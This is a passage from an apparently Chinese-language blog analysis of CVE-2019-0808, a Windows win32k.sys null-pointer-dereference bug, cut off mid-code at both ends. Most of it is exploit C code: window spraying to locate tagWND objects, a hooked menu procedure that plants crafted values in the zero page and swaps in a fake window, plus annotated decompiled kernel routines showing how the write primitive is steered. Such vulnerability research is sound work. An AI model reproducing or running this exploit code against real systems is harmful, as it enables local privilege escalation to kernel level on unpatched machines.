((secondEntryAddress - firstEntryAddress) &lt; <span class="number">0x3fd00</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[*] Primary window address: 0x%08X\r\n"</span>, firstEntryAddress);</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[*] Secondary window address: 0x%08X\r\n"</span>, secondEntryAddress);</span><br><span class="line">					hPrimaryWindow = hwndSprayHandleTable[x];</span><br><span class="line">					primaryWindowAddress = firstEntryAddress;</span><br><span class="line">					hSecondaryWindow = hwndSprayHandleTable[y];</span><br><span class="line">					secondaryWindowAddress = secondEntryAddress;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hPrimaryWindow != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[*] Found target windows!\r\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hPrimaryWindow == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't find the right windows for the tagWND primitive. Exiting....\r\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set addressToWrite to primaryWindow's cbwndExtra field.</span></span><br><span class="line">	addressToWrite = (UINT)primaryWindowAddress + <span class="number">0x90</span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">// 确保第二个窗口是正常的</span></span><br><span class="line">	<span class="keyword">if</span> (SetWindowTextW(hSecondaryWindow, <span class="string">L"test second"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Something is wrong, couldn't initialize the text buffer in the secondary window....\r\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xxxMNUpdateDraggingInfo条件构造"><a href="#xxxMNUpdateDraggingInfo条件构造" class="headerlink" title="xxxMNUpdateDraggingInfo条件构造"></a>xxxMNUpdateDraggingInfo条件构造</h4><blockquote>
<p>0x34 =&gt; addressToWriteTo<br>0x4c =&gt; secondAddress<br>0x50 =&gt; 0xFFFF…</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxMNUpdateDraggingInfo</span><span class="params">(tagMENUSTATE *pMENUSTATE, <span class="keyword">int</span> a2, <span class="keyword">int</span> uDraggingIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagMENUSTATE *pMENUSTATE_; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> *pfnid; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> ptagMenuWND; <span class="comment">// eax</span></span><br><span class="line">  tagPOPUPMENU *pPOPUPMENU; <span class="comment">// ebx</span></span><br><span class="line">  tagITEM *pItem; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> a_minus_num; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> unkown_value; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> fnid_2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v14; <span class="comment">// zf</span></span><br><span class="line">  BOOL v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> fnid; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> uIndex; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line">  UINT uDraggingFlags_; <span class="comment">// [esp+24h] [ebp+8h]</span></span><br><span class="line">  tagITEM *pItem_copy; <span class="comment">// [esp+28h] [ebp+Ch]</span></span><br><span class="line"></span><br><span class="line">  pMENUSTATE_ = pMENUSTATE;</span><br><span class="line">  pfnid = (<span class="keyword">int</span> *)&amp;pMENUSTATE-&gt;uDraggingHitArea;</span><br><span class="line">  v5 = pMENUSTATE-&gt;uDraggingHitArea;</span><br><span class="line">  v17 = *((_DWORD *)gptiCurrent + <span class="number">45</span>);</span><br><span class="line">  *((_DWORD *)gptiCurrent + <span class="number">45</span>) = &amp;v17;</span><br><span class="line">  v18 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    ++*(_DWORD *)(v5 + <span class="number">4</span>);</span><br><span class="line">  fnid = *pfnid;</span><br><span class="line">  uIndex = pMENUSTATE-&gt;uDraggingIndex;</span><br><span class="line">  uDraggingFlags_ = pMENUSTATE-&gt;uDraggingFlags &amp; <span class="number">3</span>;</span><br><span class="line">  LockMFMWFPWindow(pfnid, a2);</span><br><span class="line">  v6 = *pfnid;</span><br><span class="line">  pMENUSTATE_-&gt;uDraggingIndex = uDraggingIndex;</span><br><span class="line">  <span class="keyword">if</span> ( !IsMFMWFPWindow(v6) || (ptagMenuWND = safe_cast_fnid_to_PMENUWND(*pfnid)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *pfnid = <span class="number">0</span>;</span><br><span class="line">    pMENUSTATE_-&gt;uDraggingIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">  &#125;</span><br><span class="line">  pPOPUPMENU = *(tagPOPUPMENU **)(ptagMenuWND + <span class="number">0xB0</span>);</span><br><span class="line">  pItem = MNGetpItem(*(tagPOPUPMENU **)(ptagMenuWND + <span class="number">0xB0</span>), pMENUSTATE_-&gt;uDraggingIndex);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// pItem = MNGetpItem(pPOPUPMENU, a3);</span></span><br><span class="line">  pMENUSTATE_-&gt;uDraggingFlags = <span class="number">0</span>;</span><br><span class="line">  pItem_copy = pItem;</span><br><span class="line">  <span class="keyword">if</span> ( pItem )</span><br><span class="line">  &#123; </span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu = NULL</span></span><br><span class="line">   <span class="comment">// MNGetpItemFromIndex的第二个参数为*(DOWRD*)0x4C</span></span><br><span class="line">   <span class="comment">// 为了让MNGetpItemFromIndex返回值为方便控制的地址，我们希望它返回在零页面地址上</span></span><br><span class="line">   <span class="comment">// 从而轻松的控制这里判断中参与运算的一部分，内部返回值计算为：</span></span><br><span class="line">   <span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line">   <span class="comment">// 这里我们希望返回为0x100000180，由于只有4字节，最高位的1会去掉，从而变成0x180。-&gt;yItem 再取+0x28偏移处的值。</span></span><br><span class="line">   <span class="comment">// 所以我们0x4C的值应该满足 (*(DWORD*)0x34) + (*(DWORD*)0x4C)*0x6C = 0x100000180</span></span><br><span class="line">   <span class="comment">// 也就是代码中的</span></span><br><span class="line">   <span class="comment">// UINT secondAddress = ((0x100000180 - addressToWriteTo) / 0x6C);</span></span><br><span class="line">   <span class="comment">// 为什么不控制成其他的值呢？比如让其返回为0，如果这样，则</span></span><br><span class="line">   <span class="comment">// UINT secondAddress = (( - addressToWriteTo) / 0x6C);</span></span><br><span class="line">   <span class="comment">// 从而让-&gt;yItem取0x28偏移处的值（secondAddress就成了负数，不可以）</span></span><br><span class="line">    a_minus_num = MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem</span><br><span class="line">                + pMENUSTATE_-&gt;ptMouseLast.y</span><br><span class="line">                - *(_DWORD *)(*pfnid + <span class="number">0x54</span>);   <span class="comment">// </span></span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu = NULL</span></span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu-&gt;iTop = *(DWORD*)0x4C  =&gt; secondAddress</span></span><br><span class="line">   <span class="comment">// MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem = *(DWORD*)(0x180+0x28) = 0xf0f0f0f0 （负数还是很大的整数？）</span></span><br><span class="line">   <span class="comment">// ((pMenuState-&gt;ptMouseLast.y - pMenuState-&gt;uDraggingHitArea-&gt;rcClient.top) + pItemFromIndex-&gt;yItem) &gt; (pItem-&gt;yItem + SYSMET(CYDRAG))</span></span><br><span class="line">    unkown_value = pItem_copy-&gt;yItem;</span><br><span class="line">   <span class="comment">// 通过构造条件，始终进入分支 pMENUSTATE_-&gt;uDraggingFlags = 1;  </span></span><br><span class="line">   <span class="comment">// 这里要注意的是，原作者和网上都是分析的，0xf0f0f0f0是个足够大的数，</span></span><br><span class="line">   <span class="comment">// 从而始终可以进入pMENUSTATE_-&gt;uDraggingFlags = 2;分支</span></span><br><span class="line">   <span class="comment">// 然而我测试了将 0x50 后的内存分别覆盖为0xff，0x7f，0x80，0x00，</span></span><br><span class="line">   <span class="comment">// 0x7f也是足够的的整数了，所以这里其实是有符号整数比较，0x7f不行的原因就是太大了，进入了=2的分支。</span></span><br><span class="line">   <span class="comment">// 0xff，0x7f，0x00可以，是因为是负数，或者足够小！</span></span><br><span class="line">    <span class="keyword">if</span> ( a_minus_num &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)(unkown_value + *(_DWORD *)(gpsi + <span class="number">0x6E4</span>)) )<span class="comment">// </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a_minus_num &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)(unkown_value + pItem_copy-&gt;cyItem - *(_DWORD *)(gpsi + <span class="number">0x6E4</span>)) )</span><br><span class="line">        pMENUSTATE_-&gt;uDraggingFlags = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      pMENUSTATE_-&gt;uDraggingFlags = <span class="number">1</span>;          <span class="comment">// </span></span><br><span class="line">      <span class="comment">// pMENUSTATE_-&gt;uDraggingFlags 不能为0，为0则进入xxxMNSetGapState后不能进行或运算</span></span><br><span class="line">      <span class="comment">// 通过测试0x4C处的值，发现构造的比较值是个较小的数或负数，从而始终进入这个分支</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fnid_2 = fnid;</span><br><span class="line">  <span class="keyword">if</span> ( fnid != *pfnid )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  v13 = pMENUSTATE_-&gt;uDraggingIndex - uIndex;</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pMENUSTATE_-&gt;uDraggingFlags == <span class="number">2</span> &amp;&amp; uDraggingFlags_ == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">    v15 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( pMENUSTATE_-&gt;uDraggingIndex == uIndex )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = uDraggingFlags_ != pMENUSTATE_-&gt;uDraggingFlags;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v14 = v15 == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v13 != <span class="number">1</span> || pMENUSTATE_-&gt;uDraggingFlags != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  v14 = uDraggingFlags_ == <span class="number">2</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">    pMENUSTATE_-&gt;uDraggingFlags |= <span class="number">4u</span>;</span><br><span class="line">    <span class="comment">// 第四个参数为0，不能进入或运算</span></span><br><span class="line">    xxxMNSetGapState(fnid_2, uIndex, uDraggingFlags_, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 第四个参数为1，才能进入里面的或运算</span></span><br><span class="line">    xxxMNSetGapState(*pfnid, pMENUSTATE_-&gt;uDraggingIndex, pMENUSTATE_-&gt;uDraggingFlags, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>windbg调试证明也是进入的pMENUSTATE_-&gt;uDraggingFlags = 1;分支：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/52.png">


<h4 id="MNGetpItemFromIndex条件构造"><a href="#MNGetpItemFromIndex条件构造" class="headerlink" title="MNGetpItemFromIndex条件构造"></a>MNGetpItemFromIndex条件构造</h4><blockquote>
<p>0x20 =&gt; 0xFFFFFFFF</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    result = MNGetpItemFromIndex(*(_DWORD *)(a1 + <span class="number">0x14</span>), a2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">tagITEM *__<span class="function">stdcall <span class="title">MNGetpItemFromIndex</span><span class="params">(tagMENU *pMENU, <span class="keyword">unsigned</span> <span class="keyword">int</span> uIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagITEM *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( uIndex == <span class="number">-1</span> || uIndex &gt;= pMENU-&gt;cItems )<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支</span></span><br><span class="line">                                                <span class="comment">// pMENU-&gt;cItems = *(DWORD*)0x20 = 0xffffffff</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = &amp;pMENU-&gt;rgItems[uIndex];           <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line">                                                <span class="comment">// 注意这里返回的是0x34中的值 +0x6C*uIndex</span></span><br><span class="line">                                                <span class="comment">// 所以往0x34中放入主窗口的cbwndExtra偏移时，要-0x6C*uIndex</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="条件构造代码"><a href="#条件构造代码" class="headerlink" title="条件构造代码"></a>条件构造代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xxxMNUpdateDraggingInfo 函数获得窗口对象后，会通过 MNGetpItem 函数访问其成员 tagPOPUPMENU 对象。</span></span><br><span class="line"><span class="comment">// MNGetpItem 函数又会继续访问 tagPOPUPMENU 对象的 spmenu 成员，从而造成零指针解引用漏洞。</span></span><br><span class="line"><span class="function">LRESULT WINAPI <span class="title">SubMenuProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (msg == WM_MN_FINDMENUWINDOWFROMPOINT) &#123;</span><br><span class="line">		<span class="comment">// 拦截 MN_FINDMENUWINDOWFROMPOINT 消息, 返回触发漏洞的 hWndFakeWindow</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[*] In WM_MN_FINDMENUWINDOWFROMPOINT handler...\r\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[*] Update window[%p] proc to DefWindowProc \n"</span>, hwnd);</span><br><span class="line">		SetWindowLongW(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc);</span><br><span class="line"></span><br><span class="line">		UINT uIndex = wParam + <span class="number">0x10</span>; <span class="comment">// 这里没弄清楚是在哪里要减0x10，导致这里要加上去</span></span><br><span class="line">		UINT addressToWriteTo = ((addressToWrite + <span class="number">0x6C</span>) - (uIndex * <span class="number">0x6C</span>) - <span class="number">0x4</span>);</span><br><span class="line">		<span class="comment">// 由于写入地址会先在MNGetpItemFromIndex中进行运算，将参与运算的写入地址进行相应的计算</span></span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">		<span class="comment">// -0x4，是由于xxxMNSetGapState函数进行运算时，会取fState的偏移+0x4</span></span><br><span class="line">		<span class="comment">// pItem_copy-&gt;fState |= 0x40000000u;  =&gt; *((DWORD*)pItem_copy + 0x4) |= 0x40000000u</span></span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">		<span class="comment">// -(uIndex * 0x6C)，是由于MNGetpItemFromIndex返回的是0x34中的地址+0x6C*uIndex</span></span><br><span class="line">		<span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">		<span class="comment">// +0x6C 是因为在xxxMNSetGapState中，调用MNGetpItem时，对uIndex减了1</span></span><br><span class="line">		<span class="comment">// ptagITEM_2 = MNGetpItem(spPopupMenu_1, uIndex - 1);</span></span><br><span class="line"></span><br><span class="line">		memcpy_s((<span class="keyword">void</span>*)<span class="number">0x20</span>, <span class="number">4</span>, <span class="string">"\xFF\xFF\xFF\xFF"</span>, <span class="number">4</span>);</span><br><span class="line">		<span class="comment">// MNGetpItemFromIndex中，为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支</span></span><br><span class="line">		</span><br><span class="line">		memcpy_s((<span class="keyword">void</span>*)<span class="number">0x34</span>, <span class="number">4</span>, &amp;addressToWriteTo, <span class="number">4</span>);</span><br><span class="line">		<span class="comment">// xxxMNSetGapState中第一次调用MNGetpItem，返回运算地址，就是从0x34中取出来进行运算的</span></span><br><span class="line"></span><br><span class="line">		UINT secondAddress = ((<span class="number">0x100000180</span> - addressToWriteTo) / <span class="number">0x6C</span>);</span><br><span class="line">		memcpy_s((<span class="keyword">void</span>*)<span class="number">0x4C</span>, <span class="number">4</span>, &amp;secondAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 不设置也可以，默认为0，也很小</span></span><br><span class="line">		<span class="built_in">memset</span>((<span class="keyword">void</span>*)<span class="number">0x1A8</span>, <span class="number">0xff</span>, <span class="number">0x4</span>); <span class="comment">// 设置成为负数 (0x180+0x28)		</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 替换窗口句柄为触发漏洞的窗口</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+] Replace the window handle to fakewindow\n"</span>);</span><br><span class="line">		<span class="comment">// 拦截WM_MN_FINDMENUWINDOWFROMPOINT消息，将窗口的句柄替换为没有菜单的利用窗口</span></span><br><span class="line">		<span class="keyword">return</span> (ULONG)hWndFakeWindow;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="零页面内存分布"><a href="#零页面内存分布" class="headerlink" title="零页面内存分布"></a>零页面内存分布</h4><img src="/2019/10/10/CVE-2019-0808详细分析/50.png">

<h4 id="MNGetpItem老版本"><a href="#MNGetpItem老版本" class="headerlink" title="MNGetpItem老版本"></a>MNGetpItem老版本</h4><blockquote>
<p>xxxMNSetGapState调用之前，会先调用MNGetpItem，</p>
</blockquote>
<p>这里要注意的是，在早期的win32k.sys中，MNGetpItem是直接实现逻辑的，而后来更新的版本，又将逻辑封装到了 MNGetpItemFromIndex 函数中。</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/40.png">

<p>MNGetpItem 老版本代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &amp;&amp; (v2 = *(_DWORD *)(a1 + <span class="number">0x14</span>), a2 &lt; *(_DWORD *)(v2 + <span class="number">0x20</span>)) )</span><br><span class="line">    result = *(_DWORD *)(v2 + <span class="number">0x34</span>) + <span class="number">0x6C</span> * a2;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析整理后的MNGetpItem代码（没有封装到MNGetpItemFromIndex函数）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tagITEM *__<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(tagPOPUPMENU *spPopupMenu, <span class="keyword">unsigned</span> <span class="keyword">int</span> pPopupMenu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagMENU *spTagMenu; <span class="comment">// ecx 重点：漏洞触发时， spPopupMenu-&gt;spmenu 为NULL</span></span><br><span class="line">                      <span class="comment">//           pPopupMenu的值通过HOOK修改为0？</span></span><br><span class="line">  tagITEM *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( spPopupMenu &amp;&amp; (spTagMenu = spPopupMenu-&gt;spmenu, pPopupMenu &lt; spTagMenu-&gt;cItems) )</span><br><span class="line">    result = ((tagMENU*)&amp;spTagMenu[pPopupMenu])-&gt;rgItems;</span><br><span class="line">    <span class="comment">// result = *((DWORD*)spTagMenu + 0x34) + pPopupMenu * 0x6C;</span></span><br><span class="line">    <span class="comment">// spTagMenu-&gt;rgItems为 +0x34的偏移， [pPopupMenu] 为 +0x6C * pPopupMenu，而tagMENU结构体的大小正是0x6C。</span></span><br><span class="line">    <span class="comment">// 最终返回的是0x34内存中的值</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C语言默认情况下结构体是4字节对齐，可以算出tagMENU的大小为0x6C。相关结构体定义如下：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 